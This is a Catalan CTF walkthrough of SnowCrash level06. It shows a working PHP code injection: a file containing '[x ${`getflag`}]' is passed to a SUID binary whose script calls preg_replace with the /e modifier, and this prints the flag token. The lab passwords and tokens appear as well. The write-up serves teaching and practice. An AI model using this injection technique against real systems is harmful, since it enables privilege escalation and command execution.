# TL;DR / TLTR
##### Ens connectem al següent nivell amb el token/password obtingut en el nivell anterior:
```bash
level05@SnowCrash:~$ ssh level06@192.168.122.220 -p 4242
Could not create directory '/home/user/level05/.ssh'.
The authenticity of host '[192.168.122.220]:4242 ([192.168.122.220]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level05/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level06@192.168.122.220's password: viuaaale9huek52boumoomioc
level06@SnowCrash:~$
```
##### Llistem fitxers i directius visibles i ocults
```bash
command-not-found version: 0.2.44
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$
```
##### Observem que hi ha dos arxius interessants per analitzar, a més de percebre que són del usuari flag06 i no pas de level06
```bash
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```
###### L'arxiu level06 ens indica que té permisos ACL('+') i SUID ('s'). A més de tenir contingut interessant revelat amb el comandament strings
```bash
level06@SnowCrash:~$ strings level06
execve
/usr/bin/php
/home/user/level06/level06.php
```
```bash
level06@SnowCrash:~$ getfacl level06
# file: level06
# owner: flag06
# group: level06
# flags: s--
user::rwx
group::---
group:level06:r-x
mask::r-x
other::---
```
##### Pel que fa el fitxer level06.php conté un script
```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
###### Destaquem la línia més important
```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```
###### Desglossem per entendre:
```text
/(\[x (.*)\])/ → és la regex(patró per buscar text) que busca tot el que està dins [x ...]. Busca text que tingui forma [x... i alguna cosa més]
\[x → literalment [x
(.*) → captura tot el contingut dins [x ...]
() → grup de captura
/e → executa el resultat com a codi PHP.
```
##### Per tant podríem fer alguna cosa semblant
```bash
echo '[x ${`getflag`}]' > /tmp/exploit
```
###### Desglossem per entendre bé l'script
```text
[x ${getflag}] coincideix amb el regex (patró per buscar text)
El grup (.*) captura: ${`getflag`}
Després el PHP fará:  y("${`getflag`}")
```
##### Abans de crear l'script i tractar d'executar-l'ho. Ens assegurem que tenim permisos per escriure i executar en el directori /tmp
```bash
level06@SnowCrash:~$ ls -ld /tmp
d-wx-wx-wx 4 root root 80 Mar 20 03:14 /tmp
level06@SnowCrash:~$ 
```
##### Provem a veure si tenim èxit
```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```
